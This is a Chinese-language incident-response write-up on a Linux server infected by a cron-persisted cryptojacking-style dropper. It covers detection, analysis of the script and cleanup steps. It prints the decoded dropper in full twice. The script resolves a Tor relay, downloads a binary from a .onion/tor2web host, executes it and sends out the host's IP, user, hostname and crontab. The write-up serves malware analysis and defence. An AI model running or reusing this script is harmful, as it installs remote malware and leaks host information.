## 一、基本情况

有个小伙伴说他的机器被攻击了：![1661996588_63100e2ca098472e2fb34.png!small](https://image.3001.net/images/20220901/1661996588_63100e2ca098472e2fb34.png!small)

出现了一个随机文件名进程，并且杀掉又会起来，好吧，那就一起来看看这个主机的情况。

直接查看任务列表，发现如下痕迹：

![1661999993_63101b79640551a8f1f69.png!small](https://image.3001.net/images/20220901/1661999993_63101b79640551a8f1f69.png!small)

查看.sh脚本的内容如下：

![1662026026_6310812add4e22f63e52f.png!small](https://image.3001.net/images/20220901/1662026026_6310812add4e22f63e52f.png!small)

解码后，发现真实的脚本内容如下：

pyPySuyt4b2evYZZY0SxQQLJztPWJ  
exec &>/dev/null  
export
PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)  
c=$(echo "curl -4fsSLkA- -m200")  
t=$(echo "va6xh4hqgb754klsffjamjgotlq7mne3lyyrhu5vhypakbumzeo4c4ad")

sockz() {  
n=(dns.twnic.tw doh-ch.blahdns.com doh-de.blahdns.com doh-fi.blahdns.com doh-jp.blahdns.com doh.li doh.pub doh-sg.blahdns.com fi.doh.dns.snopyta.org
hydra.plan9-ns1.com)  
p=$(echo "dns-query?name=relay.tor2socks.in")  
q=${n[$((RANDOM%${#n[@]}))]}  
s=$($c https://$q/$p | grep -oE "\b([0-9]{1,3}\\.){3}[0-9]{1,3}\b" |tr ' '
'\n'|grep -Ev [.]0|sort -uR|tail -1)  
}

fexe() {  
for i in . $HOME /usr/bin $d /var/tmp ;do echo exit > $i/i && chmod +x $i/i &&
cd $i && ./i && rm -f i && break;done  
}

u() {  
sockz  
f=/int.$(uname -m)  
x=./$(date|md5sum|cut -f1 -d-)  
r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname
-m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print
$1'})_$(crontab -l|base64 -w0)  
$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r  
chmod +x $x;$x;rm -f $x  
}

for h in tor2web.in tor2web.it  
do  
if ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; then  
fexe;u $t.$h  
ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h)  
ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h)  
else  
break  
fi  
done  
  
---  
  
脚本第一句：pyPySuyt4b2evYZZY0SxQQLJztPWJ，这个应该是一个可执行文件，查找改文件的位置：

![1662000404_63101d14d2bc5d9c2abf3.png!small](https://image.3001.net/images/20220901/1662000404_63101d14d2bc5d9c2abf3.png!small)

查看cron.d目录的 情况如下：

![1662000767_63101e7f016c46c4c3831.png!small](https://image.3001.net/images/20220901/1662000767_63101e7f016c46c4c3831.png!small)

查看 opt目录的情况如下：

![1662001312_631020a02aa07789ca261.png!small](https://image.3001.net/images/20220901/1662001312_631020a02aa07789ca261.png!small)

可以看到，所有异常文件的时间，都是被修改成：2020年1月29日。

![1662001992_63102348e3640adde8494.png!small](https://image.3001.net/images/20220901/1662001992_63102348e3640adde8494.png!small)

查看cron的日志，发现该台服务器没有开启crontab日志，

![1662002547_631025738e01ade1d87c8.png!small](https://image.3001.net/images/20220901/1662002547_631025738e01ade1d87c8.png!small)

我们再来分析一下前面的SH脚本：

pyPySuyt4b2evYZZY0SxQQLJztPWJ  
exec &>/dev/null //输出重定向  
export
PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

//获取当前用户的目录

d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)

//curl命令的参数  
c=$(echo "curl -4fsSLkA- -m200")

//打印一段字符串，子域名前缀

t=$(echo "va6xh4hqgb754klsffjamjgotlq7mne3lyyrhu5vhypakbumzeo4c4ad")  
  
---  
  
比如下载的地址为：va6xh4hqgb754klsffjamjgotlq7mne3lyyrhu5vhypakbumzeo4c4ad.tor2web.in/int.x86_64

通过dns.twnic.tw这个DNS服务器对relay.tor2socks.in域名进行解析得到IP地址，通过https加密DNS查询结果

sockz() {  
n=(dns.twnic.tw doh-ch.blahdns.com doh-de.blahdns.com doh-fi.blahdns.com doh-jp.blahdns.com doh.li doh.pub doh-sg.blahdns.com fi.doh.dns.snopyta.org
hydra.plan9-ns1.com)  
p=$(echo "dns-query?name=relay.tor2socks.in")  
q=${n[$((RANDOM%${#n[@]}))]}  
s=$($c https://$q/$p | grep -oE "\b([0-9]{1,3}\\.){3}[0-9]{1,3}\b" |tr ' '
'\n'|grep -Ev [.]0|sort -uR|tail -1)  
}  
  
---  
  
//判断当前目录 当前用户目录 等目录是可写可执行权限

fexe() {  
for i in . $HOME /usr/bin $d /var/tmp ;do echo exit > $i/i && chmod +x $i/i &&
cd $i && ./i && rm -f i && break;done  
}  
  
---  
  
  

下载木马文件并运行，同时提交当前主机的信息

u() {  
sockz  
f=/int.$(uname -m)  
x=./$(date|md5sum|cut -f1 -d-)  
r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname
-m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print
$1'})_$(crontab -l|base64 -w0)  
$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r  
chmod +x $x;$x;rm -f $x  
}  
  
---  
  
  

#循环判断并执行，判断进程是否运行，如果进程没了，则重新下载并运行

for h in tor2web.in tor2web.it  
do  
if ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; then  
fexe;u $t.$h  
ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h)  
ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h)  
else  
break  
fi  
done  
  
---  
  
通过cp /proc/7288/exe命令，保存下载运行的文件如下：

![1662024804_63107c64cbd20b949391f.png!small](https://image.3001.net/images/20220901/1662024804_63107c64cbd20b949391f.png!small)

## 二、清除

1、通过查看/tmp/.X11-unix/文件，查看异常进程的id，使用 kill -9 进程id 杀死相关进程

![1662025009_63107d3106a27d3e4e382.png!small](https://image.3001.net/images/20220901/1662025009_63107d3106a27d3e4e382.png!small)2、使用
crontab -r 命令，移除所有定时任务（确认自己任务不要删除，如果本身有任务，用crontab -e进行处置）

3、删除 /etc/cron.d/目录下异常脚本文件

4、删除/root/目录下异常脚本文件  
5、删除 /opt/目录下异常脚本文件  
6、重启系统  
7、监视系统运行情况，过1-2个小时，看看是否有异常文件再次运行和产生。

## 另外：

由于该台主机没有开放crontab日志，同时SSH登陆日志保存时间只有1周，因此无法对植入进行溯源。

通过该台主机开放的端口情况，怀疑是通过SSH弱口令进入的系统。

鉴于该主机是处于内网的虚拟机设备，怀疑网络内部有机器中招了，因此，让小伙伴先照上述处置后，观察1-2天如果没有异常情况，可以再重新将SSH口令设置成弱口令，并启动日志记录，作为”蜜罐“，看看内网的攻击/感染源头。

